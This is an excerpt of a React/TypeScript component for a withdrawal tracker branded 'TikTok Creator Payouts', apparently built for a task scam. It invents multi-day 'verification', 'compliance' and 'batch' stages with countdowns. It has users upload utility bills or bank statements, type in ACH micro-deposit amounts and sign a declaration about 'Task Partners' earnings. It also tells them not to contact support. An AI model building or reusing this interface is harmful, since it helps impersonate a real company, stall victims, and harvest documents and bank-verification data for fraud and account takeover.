...
const WITHDRAWAL_STAGES: WithdrawalStage[] = [
  {
    ...
    text: "Your payout requires additional account verification. Complete the pending items below while our review team validates your account. This stage usually takes 3-5 business days.",
  },
  {
    id: "compliance",
    days: 7,
    ...
    text: "High-value creator payouts go through Enhanced Due Diligence. Confirm the source of your funds below. This stage usually takes 5-7 business days.",
  },
  {
    id: "batch",
    days: 7,
    ...
    text: "Payouts are transmitted in scheduled batches every 10 days. Your funds are locked in for the next batch window and no further action is required.",
  },
  {
    id: "released",
    days: 0,
...
function buildWithdrawalReference(email: string) {
  const seed = Math.abs(Array.from(email).reduce((total, char) => total * 31 + char.charCodeAt(0), 7)) % 100000;
...
function formatCountdown(ms: number) {
  ...
  return { days, clock: `${pad2(hours)}:${pad2(minutes)}:${pad2(seconds)}` };
}
...
function sendWithdrawalEmail(user: User, template: string, state: WithdrawalState) {
  void fetch("/api/public/send-access-email", {
    body: JSON.stringify({
      amount: state.amount,
...
function WithdrawalTracker(props: { state: WithdrawalState; user: User; onChange: (next: WithdrawalState) => void }) {
  ...
  const elapsedPct = isFinal ? 100 : Math.min(100, Math.max(4, ((now - startedAt) / Math.max(1, endsAt - startedAt)) * 100));
    ...
    <div>
      ...
      <section className="overflow-hidden rounded-[14px] bg-[#010101] p-5 text-white shadow-[0_18px_40px_rgba(1,1,1,.25)]">
        <div className="flex items-start justify-between gap-3">
          <div>
            <p className="text-[10px] font-black uppercase tracking-[0.18em] text-[#25F4EE]">TikTok Creator Payouts</p>
            <p className="mt-1 text-[32px] font-black leading-none">{usd(state.amount)}</p>
            <p className="mt-2 text-[11px] font-bold text-white/60">Ref {state.reference} · {state.method}</p>
          </div>
          ...
          {!isFinal && (
            <>
              ...
              <div className="mt-3 h-2 overflow-hidden rounded-full bg-white/10">
                <div className="h-full rounded-full bg-gradient-to-r from-[#25F4EE] to-[#FE2C55]" style={{ width: `${elapsedPct}%` }} />
              </div>
              <p className="mt-2 text-[11px] font-bold text-white/50">Estimated completion: {formatUSDate(new Date(endsAt))}</p>
            </>
          )}
          {isFinal && <p className="mt-2 text-sm font-bold leading-6 text-white/70">Funds transmitted to {state.method}. Posting within 1-3 business days.</p>}
        </div>
        ...
        {stage.id === "verification" && (
          <div className="mt-4 space-y-3">
            <TrackerTask
              ...
              text="Upload a utility bill or bank statement issued in the last 90 days."
              actionLabel={state.tasks.address ? "Document received" : "Upload document"}
              onAction={() => toggleTask("address")}
            />
            <div className="rounded-[8px] border border-slate-200 bg-[#F8FAFC] p-4">
              <div className="flex items-center gap-2 text-[#0F172A]"><Landmark size={18} className="text-[#FE2C55]" /><p className="text-sm font-black">ACH micro-deposit</p></div>
              <p className="mt-1 text-xs font-semibold leading-5 text-[#475569]">Two small deposits were sent to your bank account. Enter both amounts exactly as they appear on your statement.</p>
              <div className="mt-3 grid grid-cols-2 gap-3">
                <input
                  className="h-11 rounded-[8px] border border-slate-200 bg-white px-3 text-sm font-bold"
                  inputMode="decimal"
                  placeholder="$0.00"
                  value={state.micro1}
                  onChange={(event) => onChange({ ...state, micro1: event.target.value })}
                />
                <input
                  className="h-11 rounded-[8px] border border-slate-200 bg-white px-3 text-sm font-bold"
                  inputMode="decimal"
                  placeholder="$0.00"
                  value={state.micro2}
                  onChange={(event) => onChange({ ...state, micro2: event.target.value })}
                />
              </div>
              <button
                className="mt-3 h-11 w-full rounded-[8px] bg-[#010101] text-sm font-black text-white disabled:bg-slate-200 disabled:text-slate-500"
                disabled={!state.micro1.trim() || !state.micro2.trim() || Boolean(state.tasks.micro)}
                onClick={() => toggleTask("micro")}
                type="button"
              >
                {state.tasks.micro ? "Amounts confirmed" : "Confirm amounts"}
              </button>
            </div>
            <TrackerTask
              done={Boolean(state.tasks.bank)}
              icon={<ShieldCheck size={18} />}
              title="Re-confirm your payout details"
              text={`Confirm that ${state.method} is still the correct destination for this payout.`}
              actionLabel={state.tasks.bank ? "Details confirmed" : "Confirm details"}
              onAction={() => toggleTask("bank")}
            />
          </div>
        )}
        ...
        {stage.id === "compliance" && (
          <div className="mt-4 space-y-3">
            <TrackerTask
              ...
              title="Declare source of funds"
              text="Confirm that this balance came from creator audit activity on Task Partners."
              actionLabel={state.tasks.source ? "Declaration signed" : "Sign declaration"}
              onAction={() => toggleTask("source")}
            />
            <TrackerTask
              done={Boolean(state.tasks.income)}
            ...
            <p className="rounded-[8px] border border-amber-200 bg-amber-50 p-3 text-xs font-semibold leading-5 text-amber-800">
              Compliance reviews are completed automatically at the end of the review window. You do not need to contact support.
            </p>
          </div>
        )}
        ...
        {stage.id === "batch" && (
          <div className="mt-4 space-y-3">
            <div className="rounded-[8px] border border-emerald-200 bg-emerald-50 p-4">
              <p className="text-xs font-black uppercase tracking-[0.14em] text-emerald-
